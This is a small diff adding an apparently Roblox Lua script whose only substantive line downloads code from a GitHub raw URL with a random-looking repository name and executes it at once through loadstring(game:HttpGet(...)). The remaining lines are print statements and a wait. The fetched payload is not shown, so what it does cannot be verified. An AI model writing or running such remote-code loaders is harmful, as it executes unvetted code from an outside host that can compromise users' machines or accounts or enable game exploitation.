@@ -1,0 +1,5 @@
+print("Starting")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Y-ForBE-Y/ioasduq089eu3oi13u12o3u/main/Test2"))()
+wait(5)
+print("step 2")
+print("Finished")
